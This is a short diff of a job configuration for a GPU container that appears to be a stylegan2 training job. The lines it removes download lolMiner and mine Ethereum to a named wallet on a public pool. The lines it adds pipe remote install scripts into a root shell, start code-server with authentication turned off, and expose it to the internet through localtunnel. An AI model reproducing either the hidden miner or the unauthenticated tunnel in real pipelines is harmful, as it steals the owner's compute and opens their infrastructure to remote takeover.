@@ -34,12 +34,14 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
-        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.34a/lolMiner_v1.34a_Lin64.tar.gz
-
-        tar xf lolMiner_v1.34a_Lin64.tar.gz
-
-        cd 1.34a
-
-        ./lolMiner --algo ETHASH --pool us2.ethermine.org:4444 --user 0xBDa0153c2b40DB67A961135e464Df1c9B886389F.RIG_1
+        apt-get install sudo -y
+        
+        sudo apt-get install wget
+        curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+        sudo apt-get install -y nodejs
+        curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run
+        curl -fsSL https://code-server.dev/install.sh | sh
+        npm install -g localtunnel
+        code-server --bind-addr 127.0.0.1:8040 --auth none & lt --port 8040
 
       image: tensorflow/tensorflow:1.14.0-gpu-py3
